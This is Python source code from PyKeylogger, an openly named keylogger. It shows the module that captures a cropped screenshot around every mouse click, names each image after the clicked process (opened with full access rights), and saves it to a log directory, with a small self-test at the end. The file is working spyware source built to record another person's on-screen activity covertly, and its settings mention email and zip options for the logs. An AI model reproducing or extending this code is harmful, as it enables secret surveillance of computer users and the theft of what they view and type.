##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2008  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

import time
import datetime
import threading
import Image
import Queue
import os
import os.path
import traceback
import re
import logging
import sys
import copy

if os.name == 'nt':
    import win32api, win32con, win32process
    import ImageGrab
elif os.name == 'posix':
    from Xlib import X, XK, display, error
    from Xlib.ext import record
    from Xlib.protocol import rq

class ImageWriter(threading.Thread):
    def __init__(self, settings, cmdoptions, queue):
        
        threading.Thread.__init__(self)
        self.finished = threading.Event()
        
        self.cmdoptions = cmdoptions
        self.settings = settings
        self.q = queue
        
        self.createLogger()
        
        self.imagedimensions = \
           Point(self.settings['Image Capture']['Capture Clicks Width'],
                 self.settings['Image Capture']['Capture Clicks Height'])
        
        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")    #regexp filter for the non-allowed characters in windows filenames.
        
        # Hook to our display.
        if os.name == 'posix':
            self.local_dpy = display.Display()
        
        #Make sure the image directory is there. If not, create it.
        self.imagedir = os.path.join(self.settings['General']['Log Directory'],
                                     "images")
        #~ originalDir = os.getcwd()
        #~ os.chdir(self.settings['General']['Log Directory'])
        try:
            os.makedirs(self.imagedir, 0777) 
        except OSError, detail:
            if(detail.errno==17): 
                pass
            else: 
                self.logger.error("error creating click image directory",
                                  sys.exc_info())
        except: 
            self.logger.error("error creating click image directory",
                              sys.exc_info())
        
        #if (event.detail == 1) or (event.detail == 2) or (event.detail == 3):
            #self.captureclick()
        
        pass
    
    def createLogger(self):
        
        self.logger = logging.getLogger('imagewriter')
        self.logger.setLevel(logging.DEBUG)
        
        # create the "debug" handler - output messages to the console, to stderr, if debug option is set
        if self.cmdoptions.debug:
            loglevel = logging.DEBUG
        else:
            loglevel = logging.WARN
        
        consolehandler = logging.StreamHandler()
        consolehandler.setLevel(loglevel)
        formatter = logging.Formatter('%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
        consolehandler.setFormatter(formatter)
        self.logger.addHandler(consolehandler)
    
    def PrintDebug(self, stuff, exc_info=False):
        '''Write stuff to console.
        '''
        self.logger.debug(stuff, exc_info=exc_info)
    
    def run(self):
        while not self.finished.isSet():
            try:
                event = self.q.get(timeout=0.05)
                if event.MessageName.startswith("mouse left") or event.MessageName.startswith("mouse middle") or event.MessageName.startswith("mouse right"):
                    self.capture_image(event)
                    self.PrintDebug(self.print_event(event))
            except Queue.Empty:
                pass 
    
    def print_event(self, event):
        '''prints event. need this because pyhook's event don't have a default __str__ method,
        so we check for os type, and make it work on windows.
        '''
        if os.name == 'posix':
            return str(event)
        if os.name == 'nt':
            return "Window: " + str(event.Window) + "\nWindow Handle: " + str(event.WindowName) + "\nWindow's Process Name: " + self.getProcessName(event) + "\nPosition: " + str(event.Position) + "\nMessageName: " + str(event.MessageName) + "\n"
    
    def cancel(self):
        self.finished.set()
    
    #def capturewindow(self, Window = None, start_x = 0, start_y = 0, width = None, height = None, saveto = "image.png"):
    def capture_image(self, event):
        
        screensize = self.getScreenSize()

        # The cropbox will take care of making sure our image is within
        # screen boundaries.
        cropbox = CropBox(topleft=Point(0,0), bottomright=self.imagedimensions, min=Point(0,0), max=screensize)
        cropbox.reposition(Point(event.Position[0], event.Position[1]))
        
        self.PrintDebug(cropbox)
        
        #savefilename = os.path.join(self.imagedir, "click_" + time.strftime('%Y%m%d_%H%M%S') + "_" + self.filter.sub(r'__', self.getProcessName(event)) + ".png")
        savefilename = os.path.join(self.imagedir, "click_" + datetime.datetime.today().strftime('%Y%m%d_%H%M%S_') + str(datetime.datetime.today().microsecond) + "_" + self.filter.sub(r'__', self.getProcessName(event)) + "." + self.settings['Image Capture']['Capture Clicks Image Format'])
        
        if os.name == 'posix':
            
            AllPlanes = ~0

            try: #cropbox.topleft.x, cropbox.topleft.y, cropbox.size.x, cropbox.size.y, self.savefilename
                raw = self.rootwin.get_image(cropbox.topleft.x, cropbox.topleft.y, cropbox.size.x, cropbox.size.y, X.ZPixmap, AllPlanes)
                Image.fromstring("RGBX", (cropbox.size.x, cropbox.size.y), raw.data, "raw", "BGRX").convert("RGB").save(savefilename, quality=self.settings['Image Capture']['Capture Clicks Image Quality'])
                return 0
            except error.BadDrawable:
                print "bad drawable when attempting to get an image!  Closed the window?"
            except error.BadMatch:
                print "bad match when attempting to get an image! probably specified an area outside the window (too big?)"
            except error.BadValue:
                print "getimage: bad value error - tell me about this one, I've not managed to make it happen yet"
            except:
                print traceback.print_exc()
        
        if os.name == 'nt':
            img = ImageGrab.grab((cropbox.topleft.x, cropbox.topleft.y, cropbox.bottomright.x, cropbox.bottomright.y))
            img.save(savefilename, quality=self.settings['Image Capture']['Capture Clicks Image Quality'])
        
    def getScreenSize(self):
        if os.name == 'posix':
            self.rootwin = self.local_dpy.get_input_focus().focus.query_tree().root
            if self.rootwin == 0:
                self.rootwin = self.local_dpy.get_input_focus()
            return Point(self.rootwin.get_geometry().width, self.rootwin.get_geometry().height)
        if os.name == 'nt':
            return Point(win32api.GetSystemMetrics(0), win32api.GetSystemMetrics (1))
    
    def getProcessName(self, event):
        '''Acquire the process name from the event window handle for use in the image filename.
        On Linux, process name is a direct attribute of the event.
        '''
        if os.name == 'nt':
            hwnd = event.Window
            try:
                threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
                
                # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
                
                mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
                procname = win32process.GetModuleFileNameEx(mypyproc, 0)
                return procname
            except:
                #self.logger.error("Failed to get process info from hwnd.", exc_info=sys.exc_info())
                # this happens frequently enough - when the last event caused the closure of the window or program
                # so we just return a nice string and don't worry about it.
                return "noprocname"
        elif os.name == 'posix':
            return str(event.WindowProcName)
    
class Point:
    def __init__(self, x=0, y=0):
        self.x = x
        self.y = y
    def move(self, xmove=0, ymove=0):
        self.x = self.x + xmove
        self.y = self.y + ymove
    def __str__(self):
        return "[" + str(self.x) + "," + str(self.y) + "]"
    def __add__(self, other):
        return Point(self.x+other.x, self.y+other.y)
    def __sub__(self, other):
        return Point(self.x - other.x, self.y - other.y)


class CropBox:
    def __init__(self, topleft=Point(0,0), bottomright=Point(100,100), min=Point(0,0), max=Point(1600,1200)):
        
        self.topleft = copy.deepcopy(topleft)
        self.bottomright = copy.deepcopy(bottomright)
        self.min = copy.deepcopy(min)
        self.max = copy.deepcopy(max)
        self.size = self.bottomright - self.topleft
        self.maxsize = self.max - self.min
        # make sure our box is not bigger than the whole image
        if (self.size.x > self.maxsize.x):
            self.bottomright.x = self.bottomright.x - self.size.x + self.maxsize.x
        if (self.size.y > self.maxsize.y):
            self.bottomright.y = self.bottomright.y - self.size.y + self.maxsize.y
        self.center = Point(self.size.x/2 + self.topleft.x, self.size.y/2 + self.topleft.y)
        
    def move(self, xmove=0, ymove=0):
        # make sure we can't move beyond image boundaries
        if (self.topleft.x + xmove < self.min.x):
            xmove = self.topleft.x - self.min.x
        if (self.topleft.y + ymove < self.min.y):
            ymove = self.topleft.y - self.min.y
        if (self.bottomright.x + xmove > self.max.x):
            xmove = self.max.x - self.bottomright.x
        if (self.bottomright.y + ymove > self.max.y):
            ymove = self.max.y - self.bottomright.y
        self.topleft.move(xmove, ymove)
        self.bottomright.move(xmove, ymove)
        self.center = Point(self.size.x/2 + self.topleft.x, self.size.y/2 + self.topleft.y)
        #print self.center
    
    def reposition(self, newcenter = Point(500,500)):
        motion = newcenter - self.center
        self.move(motion.x, motion.y)
    
    def __str__(self):
        return str(self.topleft) + str(self.bottomright)

#~ def cropimage(imagesize=Point(1600,1200), cropboxsize = Point(100,100), centerpoint=Point(1500, 1500)):
    #~ cropbox = CropBox(Point(0,0), cropboxsize, min=Point(0,0), max=imagesize)
    #~ cropbox.move(centerpoint.x - cropbox.center.x, centerpoint.y - cropbox.center.y)
    
    #~ print cropbox
    #~ print cropbox.center

# im = ImageGrab.grab((x0, y0, x1, y1))


if __name__ == '__main__':
    
    class CmdOptions:
        def __init__(self, debug):
            self.debug = debug
    
    cmdoptions = CmdOptions(True)
    
    q = Queue.Queue()
    
    class mouseevent:
        pass
    event = mouseevent()
    event.Window = 655808
    event.WindowName = "WindowName"
    event.WindowProcName = "WindowProcName"
    event.Position = (400,400)
    event.MessageName = "mouse left up"
    
    settings={}
    settings['E-mail'] = {'SMTP Send Email':False}
    settings['Log Maintenance'] = {'Delete Old Logs':False,'Flush Interval':1000,'Log Rotation Interval':4,'Delete Old Logs':False}
    settings['Zip'] = {'Zip Enable':False}
    settings['General'] = {'Log Directory':'logs','System Log':'None','Log Key Count':True}
    settings['Image Capture'] = {'Capture Clicks Width':300,'Capture Clicks Height':300, 'Capture Clicks Image Format':'png', 'Capture Clicks Image Quality': 75}
        
    iw = ImageWriter(settings, cmdoptions, q)
    iw.start()
    q.put(event)
    time.sleep(5)
    iw.cancel()